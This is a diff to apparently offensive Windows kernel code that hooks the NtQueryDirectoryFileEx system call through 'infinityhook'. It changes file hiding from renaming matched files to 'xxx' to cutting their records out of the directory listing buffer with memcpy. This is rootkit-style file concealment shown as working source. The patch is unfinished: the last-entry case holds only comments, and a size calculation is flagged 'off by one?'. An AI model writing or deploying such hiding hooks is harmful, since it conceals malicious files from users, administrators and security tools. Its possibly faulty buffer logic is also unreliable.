@@ -371,10 +371,38 @@ NTSTATUS DetourNtQueryDirectoryFileEx(
 			kprintf("[+] infinityhook: NtQueryDirectoryFileEx: FileNameLength: %d, FileNameBuffer: %ws\n", FileInformationPtr->FileNameLength, FileNameBuffer);
 			if (wcsstr(FileNameBuffer, Settings.NtQueryDirectoryFileExMagicName)) {
 				kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE: %ws\n", FileNameBuffer);
-				
 				// change its name to be xxx
-				for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
+				/*for (size_t i = 0; i < FileInformationPtr->FileNameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) {
 					(FileInformationPtr->FileName)[i] = L'x';
+				}*/
+
+				// Not the last one
+				if (FileInformationPtr->NextEntryOffset > 0) {
+					// calculate how many bytes from the next record (current should be deleted) to the end of the buffer
+					
+					// Start at the next record - Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits);
+					PFILE_FULL_DIR_INFORMATION TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+					ULONG FileInformationBufferSizeToEnd = 0;
+					while (TempFileInformationPtr->NextEntryOffset != 0) {
+						FileInformationBufferSizeToEnd += TempFileInformationPtr->NextEntryOffset;
+						TempFileInformationPtr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)TempFileInformationPtr + TempFileInformationPtr->NextEntryOffset); // Move the pointer to the next structure (NextEntryOffset is in bytes, so calculate using pointer to 8bits)
+					}
+					// last record size (with filename)
+					FileInformationBufferSizeToEnd += sizeof(FILE_FULL_DIR_INFORMATION) + TempFileInformationPtr->FileNameLength; // off by one?
+
+					// next structure address - start copying from there
+					PFILE_FULL_DIR_INFORMATION NextFileInformationStructAddr = (PFILE_FULL_DIR_INFORMATION)((PUINT8)FileInformationPtr + FileInformationPtr->NextEntryOffset);
+
+					memcpy(FileInformationPtr, NextFileInformationStructAddr, FileInformationBufferSizeToEnd);
+
+					continue; // handle the same structure address next (because it was moved)
+				}
+
+				// Last one
+				else {
+					kprintf("[+] infinityhook: NtQueryDirectoryFileEx: SHOULD HIDE - LAST ONE\n");
+					// set previous NextEntryOffset to 0
+					// erease this FileInformation structure
 				}
 			}
 
